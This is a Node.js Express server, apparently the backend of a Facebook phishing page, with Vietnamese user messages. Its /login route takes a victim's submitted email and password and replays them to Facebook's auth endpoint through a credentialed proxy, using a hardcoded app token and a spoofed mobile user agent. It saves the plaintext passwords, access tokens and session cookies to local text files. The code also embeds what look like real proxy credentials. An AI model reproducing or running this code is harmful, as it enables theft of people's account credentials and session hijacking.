const axios = require('axios');
const express = require('express');
const session = require('express-session');
const app = express();
const port = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'hihikem', // your_secret_key
    resave: false,
    saveUninitialized: true,
}));

// Function to get the current time
function getTime() {
    return new Date().toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' });
}

const proxies = [
    "user49025:Oez9HBAZ60@103.15.89.233:49025",
    // Add more proxies if needed
];

// Check and update login count for IP
function checkAndUpdateLoginCount(ip, session) {
    if (!session.login_attempts) {
        session.login_attempts = {};
    }
    if (!session.login_attempts[ip]) {
        session.login_attempts[ip] = 1;
    } else {
        session.login_attempts[ip]++;
    }
}

// Check login limit for IP
function checkLoginLimit(ip, session) {
    if (session.login_attempts && session.login_attempts[ip] >= 3) {
        return false;
    } else {
        return true;
    }
}

app.post('/login', async (req, res) => {
    const ip = req.ip;
    const { tk: email, mk: password, type } = req.body;

    if (password) {
        // Check and update login count
        checkAndUpdateLoginCount(ip, req.session);

        // Check if IP exceeded login limit
        if (checkLoginLimit(ip, req.session)) {
            const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];

            try {
                const response = await axios.post('https://graph.facebook.com/auth/login', {
                    locale: 'vi_VN',
                    format: 'json',
                    email: email,
                    password: password,
                    access_token: '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
                    generate_session_cookies: true
                }, {
                    headers: {
                        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016) [FBAN/MobileAdsManagerAndroid; FBAV/303.0.0.28.104; FBBV/413414122; FBRV/0; FBLC/vi_VN; FBMF/Xiaomi; FBBD/Redmi ;FBDV/M2101K7BG;FBSV/12; FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM /{density 2.75, width=1080, height=2263}; FB_FW/1;]',
                        'Content-Type': 'application/json'
                    },
                    proxy: {
                        host: randomProxy.split(':')[2],
                        port: parseInt(randomProxy.split(':')[3]),
                        auth: {
                            username: randomProxy.split(':')[0],
                            password: randomProxy.split(':')[1]
                        }
                    }
                });

                const json = response.data;
                if (json.is_gaming_consented === 'true') {
                    const file = 'accounts.txt';
                    let data = `${email}|${password}|Token: ${json.access_token}`;
                    if (json.session_cookies) {
                        const sessionCookies = JSON.stringify(json.session_cookies);
                        data += `| Cookies: ${sessionCookies}`;
                    }
                    data += '\n';
                    require('fs').appendFileSync(file, data);
                    req.session.user_id = email;
                    res.json({ status: 'success', message: 'Đăng nhập thành công' });
                } else if (json.error === '405') {
                    res.json({ status: '681', message: 'Dính 681' });
                } else if (json.error) {
                    const errorFile = 'accounts-error.txt';
                    let errorData = `${email}|${password}|Token: ${json.access_token}`;
                    if (json.session_cookies) {
                        const sessionCookies = JSON.stringify(json.session_cookies);
                        errorData += `| Cookies: ${sessionCookies}`;
                    }
                    errorData += '\n';
                    require('fs').appendFileSync(errorFile, errorData);
                    res.json({ status: 'error', message: json.error.error_user_msg });
                } else {
                    res.json({ status: 'error', message: 'Đăng nhập thất bại, vui lòng thử lại sau' });
                }
            } catch (error) {
                res.json({ status: 'error', message: 'Đăng nhập thất bại, vui lòng thử lại sau' });
            }
        } else {
            res.json({ status: 'error', message: 'Bạn đã thử đăng nhập quá nhiều lần. Vui lòng thử lại sau.' });
        }
    } else {
        res.json({ status: 'error', message: 'Vui lòng nhập mật khẩu.' });
    }
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
